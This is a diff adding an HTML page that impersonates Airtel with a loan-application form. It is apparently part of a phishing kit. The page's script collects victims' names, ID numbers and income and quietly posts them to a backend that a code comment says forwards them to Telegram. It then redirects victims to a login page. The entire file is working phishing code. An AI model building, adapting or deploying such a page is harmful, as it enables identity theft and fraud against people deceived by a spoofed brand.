@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel - Demande</title>
+    <style>
+        * { box-sizing: border-box; font-family: sans-serif; }
+        body { margin: 0; background-color: #f4f4f4; display: flex; justify-content: center; }
+        .app-container { width: 100%; max-width: 400px; background: white; min-height: 100vh; }
+        .header { background-color: #E40000; padding: 15px; color: white; }
+        .header h1 { margin: 0; font-size: 18px; }
+        .form-container { padding: 20px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-weight: bold; color: #E40000; font-size: 13px; margin-bottom: 5px; }
+        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; }
+        .btn-main { width: 100%; background-color: #E40000; color: white; font-size: 16px; font-weight: bold; padding: 15px; border: none; border-radius: 8px; margin-top: 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="header">
+            <h1>Demande de prêt</h1>
+        </div>
+        <div class="form-container">
+            <div class="form-group"><label>Nom complet</label><input type="text" id="fName" required></div>
+            <div class="form-group"><label>Numéro d'identification</label><input type="text" id="fID" required></div>
+            <div class="form-group"><label>Montant du prêt (USD)</label><input type="text" id="fAmount" readonly style="background:#eee; font-weight:bold; color:#E40000;"></div>
+            <div class="form-group"><label>Statut d'emploi</label><select id="fEmp"><option>Travailleur indépendant</option><option>Employé</option><option>Sans emploi</option></select></div>
+            <div class="form-group"><label>Revenu net mensuel (USD)</label><input type="number" id="fIncome" required></div>
+            <button class="btn-main" onclick="submitForm()">SOUMETTRE</button>
+        </div>
+    </div>
+
+    <script>
+        // Load Amount from previous page
+        document.addEventListener("DOMContentLoaded", function() {
+            var amt = sessionStorage.getItem('loanAmount') || 50000;
+            document.getElementById('fAmount').value = "USD " + parseFloat(amt).toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+        });
+
+        function submitForm() {
+            var name = document.getElementById('fName').value;
+            var id = document.getElementById('fID').value;
+            var income = document.getElementById('fIncome').value;
+
+            if(!name || !id || !income) {
+                alert("Veuillez remplir tous les champs.");
+                return;
+            }
+
+            // Send Application to Telegram in background
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'APPLICATION', userId: 'APP', 
+                    data: { phone: "À venir", value: `Name: ${name}, Income: ${income}` } 
+                })
+            }).catch(e => console.log(e));
+
+            window.location.href = 'login.html';
+        }
+    </script>
+</body>
+</html>
